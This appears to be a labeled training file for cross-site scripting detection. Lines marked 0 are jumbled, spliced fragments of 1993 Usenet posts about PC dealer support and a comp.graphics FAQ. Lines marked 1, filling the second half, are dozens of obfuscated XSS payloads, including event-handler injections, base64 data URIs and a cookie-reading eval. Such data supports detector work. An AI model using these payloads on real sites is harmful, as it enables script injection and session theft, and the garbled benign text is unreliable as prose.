>In article <C4uEoM.EvF@odin.corp.sgi.com>, mikey@sgi.com (Mike Yang) says: XD	0
>>So, by going mailorder through Gateway, I save ~13%.  Plus, I get	0
>>technical support over the phone, free software package.<<	0
>Have fun trying to get hold of technical support over the phone.  At least<	0
>locally you can walk right up to the dealer and tell him what is wrong, and<	0
>he has to fix it. How long does he have to take in fixing it? =O Does he have to use new	0
parts when he repairs it or can he substitute used parts without your >-<	0
John T. Grieggs <grieggs@jpl-devvax.jpl.nasa.gov> is the poster of the	0
but he claims are due to improper maintenance on your part? >-<	0
When it comes to local dealers <what>:	0
- Have fun getting consistently good support.  Most of their "techs" are	0
re-treaded salesmen, not trained technicians, with a high turnover rate. :-Z	0
one's career and/or personal background	0
to select something necessary to make a necessary selection	0
Can I use the Roman script ?	0
Having been both a *** technician, and a service manager, at a	0
ComputerLand franchise and another retail computer place, I know a complimentary copy	0
I also know the "local service" scam that retail computer dealers like	0
to push when they're selling.  It's that same old song that car dealers	0
having been singing for years -- "Buy from me and you'll get good	0
service. We always treat our customers right!  Buy from <my competition>	0
and you'll be sorry if you need service." :-@	0
to reflect on one's past behaviour deeply	0
companies that give excellent script , including overnight replacement parts,	0
on-site calls, etc. There are probably some local dealers that can give you javascript	0
good service, too. But if you think all local dealers give consistenly good	0
It's entitled: (date) comp.graphics Frequently Asked Questions (FAQ)	0
but I'm sure there are others on the net can do a better job than I can. (:-	0
- Ted Drude (tbdrude@infonode.ingr.com)	0
Archive-name: graphics/resources-list/part1 X))))))	0
Last-modified: <1993/>04/17	0
Computer Graphics Resource Listing : WEEKLY POSTING [ PART 1/3 ]	0
<Last Change : 17 April 1993>	0
Many FAQs, including this Listing, are available on the archive site	0
pit-manager.mit.edu (alias rtfm.mit.edu) [18.172.1.27] in the directory	0
pub/usenet/news.answers.  The name under which a FAQ is archived appears	0
in the Archive-name line at the top of the article.	0
This FAQ is archived as graphics/resources-list/part[1-3]	0
There's a mail server on that machine. You send a e-mail message to	0
<mail-server@pit-manager.mit.edu> containing the keyword "help" (without quotes!) in the message body. :-Q	0
You can see in many other places for this Listing. See the item:	0
0. Places to find the Resource Listing for more information.	0
RE-ARRANGED the subjects, in order to fir better in the 63K/article limit.	0
I PLAN ON CHANGING HEADERS SOON, SO BE CAREFUL! ONLY THE "Resource Listing" :-X	0
keys are sure to remain in the Subject: line!	0
0. Places to find the Resource Listing	0
a. Public domain, free and shareware systems	0
Disclaimer: I do not guarantee the accuracy of this document. Use it at your own risk.	0
[ I'm thinking of making this post bi-weekly. What do you think??? ]	0
Lines which got changed, have the `#' character in front of them. :-))	0
Added lines are prepended with a `+'	0
Removed lines are just removed. Use <'diff'> to locate these changes.	0
This text is (C)Copyright 1992, 1993 of Nikolaos C. Fotis. You can copy	0
freely this file, provided you keep this copyright notice intact.	0
Compiled by Nikolaos (Nick) C. Fotis, e-mail: nfotis@theseas.ntua.gr	0
#This file is crossposted to comp.graphics, comp.answers and news.answers,	0
Disclaimer: I do not guarantee the accuracy of this document. Use it at your own risk. B:-)	0
This is mainly a guide for computer graphics software.	0
I would suggest reading the Comp. Graphics FAQ for image analysis stuff.	0
/></track><video><source onerror=javascript:window.onerror=alert();script:al\u0065rt();	1
 onmouseover='alert("xss".toUpperCase())	1
!#%&)(*+,-./:;=?@]\[^_'}|{~""" style="background:url(javascript:alert(1))" "	1
!#%&)(*+,-./:;=?@]\[^_'}|{~"<s>"><script>alert(1)</script>	1
!#%&)(*+,-./:;=?@]\[^_'}|{~&#39;<s>&#39;><script>alert(1)</script>	1
!#%&)(*+,-./:;=?@]\[^_'}|{~<s><script>alert(1)</script>	1
!#%&)(*+,-./:;=?@]\&#39;&#39;style=&#39;background:url(javascript:alert(1))&#39; &#39;	1
" onmouseover="alert('\u0058\u0053\u0053')	1
" onmouseover="alert('&#0088;&#0083;&#0083;')	1
" onmouseover="alert(/&#0088;&#0083;&#0083;/.source)	1
"'><script>eval("alert(document\x2ecookie)")</script>	1
"/onmousemove="window['\u0061lert']('\u0058SS')	1
"/onmouseover="window['aler'+'t']('XS'+'S')">	1
"&#39;><img src="javascript:alert(1)>	1
"&#39;><script>alert(1)</script> onclick=alert(1)	1
"</table><video><source onerror=javascript:window.onerror=alert();onerror=\u0061lert();	1
"</table><video><source onerror=jAvaScrIpt:window.onerror=alert();onerror=\u0061lert();	1
"><script>eval('u0061u006cu0065u0072u0074u0028u0027u0058u0053u0053u0027u0029');</script>	1
"><script>eval("al"+"ert(1)");</script>	1
"><svg><script>alert&#40/1/.source&#41</script>	1
"onbeforepaste="&#000119indow['&#00097lert']('&#00088SS')" 	1
"onblur="&#x0077indow['&#x0061lert']('&#x0058SS')" 	1
"oncopy="&#0119indow['&#097lert']('&#088SS')" 	1
"ondblclick="&#00119indow['&#0097lert']('&#0088SS')"	1
"onKeyDown="document.write('<x73cript>x61lert(x22XSSx22)</x73cript>')"	1
"onKeyPress="/127641/['constructor']['constructor']('al'+'ert'+'('+'''+1+'''+')')()	1
"onKeyPress="u0077indow['u0061lert']('u0058SS')" 	1
"onmouseover="&#x077indow['&#x061lert']('&#x058SS')" 	1
"onmouseover="alert(decodeURI(decodeURI(/%58%53%53/.source)))"	1
"onpaste="&#119indow['&#97lert']('&#88SS')" 	1
"onSelectStart="/123441/['cons'+'truc'+'tor']['cons'+'truc'+'tor']('a'+'l'+'e'+'r'+'t'+'('+'''+'XS'+'S'+'''+')')()	1
"onSelectStart="&#x00077indow['&#x00061lert']('&#x00058SS')"	1
"st%00yle="behavior:\0075rl(bc)"onread%00ystatechange="ale%00rt(1)	1
\u0061lert();script:\u0061lert();<video><source onerror=javascript:window.onerror=alert``;java	1
&#39; style=&#39;background:url(javascript:alert(1))&#39; &#39;	1
&#39;<s>&#39;><img src="javascript:alert(1)&#39;>	1
&#39;<s>&#39;><script>alert(1)</script>	1
&#39;><s><img src="javascript:alert(1)>	1
&#x09;</track><video><source onerror=javascript:window.onerror=alert();\u0061lert``;	1
&#x09;rel=<video><source <thead onerror=\u0061lert();	1
#saivs.js <video><source onerror=javascript:window.onerror=alert();javascript:alert();	1
%83%A1%82%83%A1%9E%83%A1%9Cscript%20%83%A1%9E%20alert(1)//%20%83%A1%9C/script%20%83%A1%9E	1
%EF%BC%9Cscript%EF%BC%9Ealert(1)%EF%BC%9C/script%EF%BC%9E	1
` onmouseover=`alert(/xss/.source.toUpperCase())	1
</command>enctype=rows=<video><source onerror=alert();	1
</form>al\u0065rt``;<video><source onerror=javascript:window.onerror=alert();alert();	1
</frameset></track><video><source src=x onerror=javascript:window.onerror=alert();	1
</iframe> /></textarea><video><source onerror=alert();	1
<%u00df style="color:ex/***/pression(alert(1));"/>	1
<a href="test:),< s c r i p t > a l e r t ( document.domain ) < / s c r i p t >">click me</a>	1
<a href=data:html;base64,PHNjcmlwdD5hbGVydCgwKTs8L3NjcmlwdD4=>a</a>	1
<body onload=alert(1); />	1
<body onmouseover=alert(1); <canvas </basefont>	1
<div style="color:\0065xpression(alert('XSS2'));">b</div>	1
<div style="color:&#x65;xpression(alert(1));">a</div>	1
<div style="left:&#x0065;xpression(alert(1))">	1
<embed onload=alert();<script type="text/javascript">	1
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>	1
<embed/<a/onload=alert();?n<script type="text/javascript">	1
<embed/onload=al?u0065rt();?n<script type="text/javascript">	1
<embed/src=# onload=confirm();?n<script type="text/javascrip t">	1
<frameset><frame/onload=alert(1); />	1
<iframe onload=alert``; /><select	1
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></iframe>	1
<iframe src=# <keygen onload=alert();?n<script></script>	1
<iframe/*/onload=charset=alert();>	1
<iframe/onload=alert();>size=<command	1
<iframe/onload=alert(1); />	1
<img src= <meter onerror=alert();?n<script></script>	1
<img src=# <keygen onerror=?u0061lert``;>	1
<img src=x alt=confirm(1) onmouseover=eval(alt)>	1
<keygen name="confirm(1)" onfocus="eval(this.name);" autofocus>	1
<object/data=evil.html #</a>	1
<object/onload="onfocus=alert();"<script type="text/javascri pt">	1
<object/src=# onload=alert();?n<script type="text/javascript ">	1
<object/src=x onload=alert(1);?n<script type="text/javascript">	1
<progress </caption><video><source <body onerror=alert();	1
<script src="data:text/html,al?u0065rt``;"<script></script>	1
<script src="http://example.com/xss.jpg"></script>	1
<script src=# <label onerror=confirm();?n<script></script>	1
<script/src="data:text/html,alert();"<script></script>	1
<script>al?u0065rt();</script></tr><th/	1
<script>al?u0065rt();</script></tr><th/	1
<script>onerror=?u0061lert(1);</script>	1
<style><img src='</style><img src=x onerror=alert(1)//'>	1
<svg/<canvas/<select/onload=confirm();>	1
<svg/<canvas/<select/onload=confirm(1);>	1
<svg/onload="?u0061lert();"></output>	1
<svg/onload=al?u0065rt();?n<script type="text/javascript">	1
<svg/onload=alert(1); </del>	1
<svg><style><img/src=x onerror=alert(1)// </b>	1
<video><source <tfoot <td onerror=javascript:window.onerror=alert();alert();	1
al?u0065rt();<script>confirm();</script>	1
colspan=<iframe <a onload=al?u0065rt();>	1
icon=<body <input/onload=confirm(1);>	1
icon=<iframe/<body onload=?u0061lert();>	1
icon=<iframe/<img onload=al?u0065rt();>	1
javascript:\u0061lert();</script><frameset><basefont/</td>	1
kind=<body <img onload=alert``;>	1
onerror=javascript:window.onerror=alert();</td><video><source onerror=javascript:window.onerror=alert();script:al\u0065rt();	1
